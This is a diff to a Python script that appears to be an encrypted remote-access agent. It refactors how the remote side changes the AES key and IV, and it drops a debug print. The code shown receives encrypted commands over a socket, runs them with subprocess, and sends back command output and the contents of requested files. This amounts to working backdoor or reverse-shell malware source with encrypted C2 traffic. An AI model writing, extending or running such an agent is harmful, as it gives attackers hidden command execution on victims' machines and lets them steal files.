@@ -43,9 +43,13 @@ def sendit(conn, message):
     conn.sendall(length)
     conn.sendall(message)
 
-def main():
+def update_aeskeys(command):
     global aeskey
     global aesiv
+    aeskey = command[1]
+    aesiv = command[2]
+
+def main():
     conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
@@ -58,9 +62,10 @@ def main():
             received = str(do_decrypt(data).strip(), 'utf-8')
             if 'aeskey' in received:
                 command = ast.literal_eval(received)
+                update_aeskeys(command)
+                sendit(conn, do_encrypt('Updated AES key'))
             else:
                 command = received.split(' ')
-            print(command)
             if 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -71,10 +76,6 @@ def main():
                 with open(command[1]) as f:
                     tmp = f.read()
                 sendit(conn, do_encrypt(bytes(tmp)))
-            elif command[0] == b'aeskey'
-                aeskey = command[1]
-                aesiv = command[2]
-                sendit(conn, do_encrypt('Updated AES key\n'))
         except socket.error as err:
             print("{0}\n".format(err))
     return
